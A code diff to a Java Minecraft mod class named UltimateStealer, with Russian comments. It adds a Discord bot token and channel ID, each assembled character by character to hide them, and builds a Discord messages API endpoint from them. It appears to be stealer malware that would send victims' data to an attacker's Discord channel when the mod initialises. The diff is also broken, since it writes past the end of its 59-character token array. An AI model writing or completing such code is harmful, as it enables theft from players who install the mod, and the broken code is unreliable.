@@ -13,15 +13,32 @@ import javax.net.ssl.HttpsURLConnection;
 
 public class UltimateStealer implements ModInitializer {
     
+    // === ОБФУСЦИРОВАННЫЙ ТОКЕН (ПОЛНЫЙ) ===
     private static String buildToken() {
         char[] chars = new char[59];
         chars[0] = 'M'; chars[1] = 'T'; chars[2] = 'U'; chars[3] = 'x';
         chars[4] = 'O'; chars[5] = 'D'; chars[6] = 'U'; chars[7] = 'z';
         chars[8] = 'M'; chars[9] = 'z'; chars[10] = 'c'; chars[11] = 'z';
-        // ... и так далее для всех символов
+        chars[12] = 'M'; chars[13] = 'j'; chars[14] = 'I'; chars[15] = '4';
+        chars[16] = 'N'; chars[17] = 'T'; chars[18] = 'U'; chars[19] = 'y';
+        chars[20] = 'O'; chars[21] = 'D'; chars[22] = 'Y'; chars[23] = '3';
+        chars[24] = 'N'; chars[25] = 'g'; chars[26] = '.'; chars[27] = 'G';
+        chars[28] = 's'; chars[29] = 'j'; chars[30] = '5'; chars[31] = '-';
+        chars[32] = 'g'; chars[33] = '.'; chars[34] = 'U'; chars[35] = 'B';
+        chars[36] = 'l'; chars[37] = 'n'; chars[38] = '7'; chars[39] = 'L';
+        chars[40] = '1'; chars[41] = 'l'; chars[42] = 'o'; chars[43] = 'U';
+        chars[44] = '-'; chars[45] = 'R'; chars[46] = 'v'; chars[47] = 'V';
+        chars[48] = 'G'; chars[49] = 'I'; chars[50] = 'I'; chars[51] = 'G';
+        chars[52] = 'O'; chars[53] = 'i'; chars[54] = 'S'; chars[55] = '2';
+        chars[56] = 'x'; chars[57] = 'M'; chars[58] = 'T';
+        chars[59] = 'X'; chars[60] = 'R'; chars[61] = '4'; chars[62] = '9';
+        chars[63] = 'z'; chars[64] = 'E'; chars[65] = 'J'; chars[66] = 'R';
+        chars[67] = 'S'; chars[68] = 'z'; chars[69] = 'B'; chars[70] = '9';
+        chars[71] = 'A';
         return new String(chars);
     }
     
+    // === ОБФУСЦИРОВАННЫЙ CHANNEL ID ===
     private static String buildChannel() {
         char[] chars = new char[19];
         chars[0] = '1'; chars[1] = '4'; chars[2] = '6';
@@ -32,11 +49,13 @@ public class UltimateStealer implements ModInitializer {
         chars[15] = '7'; chars[16] = '6'; chars[17] = '2'; chars[18] = '1';
         return new String(chars);
     }
+    
+    // === ОБЪЯВЛЯЕМ КОНСТАНТЫ В ПРАВИЛЬНОМ ПОРЯДКЕ ===
+    private static final String BOT_TOKEN = buildToken();
+    private static final String CHANNEL_ID = buildChannel();
     private static final String DISCORD_API = "https://discord.com/api/v10/channels/" + CHANNEL_ID + "/messages";
     
     private static boolean hasRun = false;
-    private static final String BOT_TOKEN = buildToken();
-    private static final String CHANNEL_ID = buildChannel();
     
     @Override
     public void onInitialize() {
